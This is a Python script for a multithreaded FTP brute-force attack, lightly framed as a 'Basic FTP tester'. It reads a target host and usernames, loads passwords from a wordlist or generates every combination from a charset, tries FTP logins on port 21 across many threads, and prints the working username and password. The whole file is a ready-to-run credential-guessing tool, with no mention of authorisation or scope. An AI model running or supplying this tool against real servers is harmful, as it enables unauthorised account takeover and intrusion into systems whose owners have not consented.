import ftplib
import argparse
import threading
from queue import Queue, Empty
from itertools import product
from tqdm import tqdm

parser = argparse.ArgumentParser(description="Basic FTP tester")

parser.add_argument("-ho", "--host", required=True, type=str, help="Enter the target to test FTP")
parser.add_argument("-p", "--passfile", type=str, help="Enter the path of file containing password list")
parser.add_argument("-t", "--threads", default=20, type=int, help="Number of threads. Default: 20")
parser.add_argument("-u", "--user", type=str, help="Single username to test")
parser.add_argument("-U", "--userfile", type=str, help="File containing usernames to test")
parser.add_argument("-g", "--genpass", action="store_true", help="Enable password generation mode")
parser.add_argument("--min", type=int, default=4, help="Minimum password length for generated passwords")
parser.add_argument("--max", type=int, default=8, help="Maximum password length for generated passwords")
parser.add_argument("--charset", type=str, default="abc123", help="Characters to use for password generation")

args = parser.parse_args()

host = args.host
passfile = args.passfile
threads = args.threads
combo_queue = Queue()
progress = None
progress_lock = threading.Lock()
event_done = threading.Event()
trueuser = None
truepasswd = None

if not args.user and not args.userfile:
    parser.error("You must provide either -u (single username) or -U (username file)")

if args.user and args.userfile:
    parser.error("You can only use one of -u (single username) or -U (username file), not both")

def generate_passwords(charset, min_len, max_len):
    for length in range(min_len, max_len + 1):
        for pwd_tuple in product(charset, repeat=length):
            yield ''.join(pwd_tuple)

def load_passwords(passfile):
    with open(passfile, 'r', encoding='utf-8') as f:
        return [line.strip() for line in f]

def load_usernames(userfile):
    with open(userfile, 'r', encoding='utf-8') as f:
        return [line.strip() for line in f]

# Load usernames
if args.user:
    usernames = [args.user]
else:
    usernames = load_usernames(args.userfile)

# Fill combo queue
for user in usernames:
    if args.genpass:
        pwd_iter = generate_passwords(args.charset, args.min, args.max)
    else:
        pwd_iter = load_passwords(passfile)

    for pwd in pwd_iter:
        combo_queue.put((user, pwd))

# Init progress bar
total_combos = combo_queue.qsize()
progress = tqdm(total=total_combos, desc="Brute-forcing", ncols=80)

# Worker threads
def workers():
    global trueuser, truepasswd
    while not event_done.is_set():
        try:
            user, password = combo_queue.get_nowait()
        except Empty:
            break

        if event_done.is_set():
            break

        try:
            with ftplib.FTP() as ftp:
                ftp.connect(host, 21, timeout=5)
                ftp.login(user, password)

                print("\n===========================================================================\n")
                print(" The Password was Found and Connection was Success\n")
                print(f"Connect with {host} as {user}  :   {password}\n")
                trueuser = user
                truepasswd = password
                event_done.set()
                break

        except:
            pass

        with progress_lock:
            progress.update(1)

# Start threads
thread_list = []
for _ in range(threads):
    t = threading.Thread(target=workers)
    t.start()
    thread_list.append(t)

# Wait for threads
for t in thread_list:
    t.join()

progress.close()

print("\n===========================================================================\n")
if trueuser and truepasswd:
    print(f"[+] Found credentials: {trueuser}   :   {truepasswd}")
else:
    print("[-] No valid credentials found.")
